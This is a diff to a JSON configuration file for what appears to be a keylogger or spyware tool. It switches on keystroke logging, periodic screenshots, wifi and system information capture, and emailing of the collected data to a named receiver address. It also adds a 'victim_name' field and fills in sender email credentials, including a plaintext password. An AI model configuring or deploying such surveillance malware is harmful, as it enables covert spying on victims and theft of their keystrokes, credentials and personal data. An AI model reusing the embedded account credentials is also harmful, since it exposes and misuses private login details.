@@ -1,16 +1,18 @@
 {
-    "info_email_receiver": "email receiving the info",
-    "email_send": 120,
+    "info_email_receiver": "rowejake19@gmail.com",
+    "send_info": true,
+    "email_send_time": 40,
     "take_screenshot": true,
-    "screenshot_time": 10,
+    "screenshot_time": 35,
     "key_logg": true,
     "get_wifi_info": true,
     "system_info": true,
+    "victim_name": "",
 
 
 
-    "sender_email_address": "sender email address",
-    "sender_email_password": "sender email password"
+    "sender_email_address": "johndoe874123@gmail.com",
+    "sender_email_password": "!@#!@#123123"
 
 }
 
